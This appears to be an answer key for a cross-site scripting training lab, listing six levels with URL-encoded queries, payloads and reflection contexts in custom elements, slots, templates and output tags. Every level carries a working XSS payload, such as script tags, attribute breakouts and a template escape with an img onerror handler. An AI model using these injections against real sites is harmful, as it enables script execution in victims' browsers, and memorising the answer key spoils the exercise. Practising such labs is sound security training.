# customtag — solutions

Reflections inside custom elements, is= built-ins, slots, templates, output.

### customtag-level1

`/customtag/level1/?query=%3Cscript%3Ealert(1)%3C/script%3E`

- payload: `<script>alert(1)</script>`
- context: raw reflection inside `<custom-element>`

### customtag-level2

`/customtag/level2/?query=%22%3E%3Cscript%3Ealert(1)%3C/script%3E`

- payload: `"><script>alert(1)</script>`
- context: inside `<x-widget data-value="...">` — break attribute then inject

### customtag-level3

`/customtag/level3/?query=%3Cscript%3Ealert(1)%3C/script%3E`

- payload: `<script>alert(1)</script>`
- context: raw reflection inside `<div is="custom-div">`

### customtag-level4

`/customtag/level4/?query=%22%3E%3Cscript%3Ealert(1)%3C/script%3E`

- payload: `"><script>alert(1)</script>`
- context: inside `<slot name="...">` — break attribute then inject

### customtag-level5

`/customtag/level5/?query=%3C/template%3E%3Cimg%20src=x%20onerror=alert(1)%3E`

- payload: `</template><img src=x onerror=alert(1)>`
- context: inside `<template>` (inert) — close the template, then inject

### customtag-level6

`/customtag/level6/?query=%3Cscript%3Ealert(1)%3C/script%3E`

- payload: `<script>alert(1)</script>`
- context: raw reflection inside `<output>`
